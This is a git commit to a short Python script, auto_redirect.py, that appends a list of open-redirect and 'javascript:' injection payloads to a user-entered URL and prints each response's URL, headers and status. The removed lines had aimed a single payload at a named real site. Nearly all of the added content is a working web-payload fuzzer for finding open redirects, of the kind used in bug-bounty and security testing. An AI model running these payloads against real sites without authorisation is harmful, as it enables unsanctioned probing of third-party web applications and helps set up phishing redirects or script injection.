7ad9ae50630b8ea53889d9fed88e0b7ebe3e9549
B3nac <Rockapparatus@yahoo.com>
2017-07-18 23:04:30 -0700

    W00t w00t.

--- auto_redirect.py
+++ auto_redirect.py
@@ -1,12 +1,25 @@
 import requests
+payloads = [r"java%0d%0ascript%0d%0a:alert(0)",
+            r"//google.com",
+            r"https:google.com",
+            r"//google%E3%80%82com",
+            r"\/\/google.com/",
+            r"/\/google.com/",
+            r"//google%00.com",
+            r"http://google.com/"]
 
-payload = '//google.com'
-url = 'http://vudu.com' + payload
+url = input('')
 
-r = requests.get(url, timeout=1)
-
-print("URL:", r.url,"\n")
-
-print("Headers:", r.headers, "\n")
-print("Status:", r.status_code, "\n")
+for payload in payloads:
+    try:
+        r = requests.get((url+payload), timeout=1)
+        print("URL:", r.url,"\n")
+        print("Headers:", r.headers, "\n")
+        print("Status:", r.status_code, "\n")
+    except requests.Timeout:
+        print("Timeout!")
+    except requests.exceptions.ConnectionError:
+        print("An exception occured!")
+    except requests.exceptions.MissingSchema:
+        print("Missing Schema!")
 
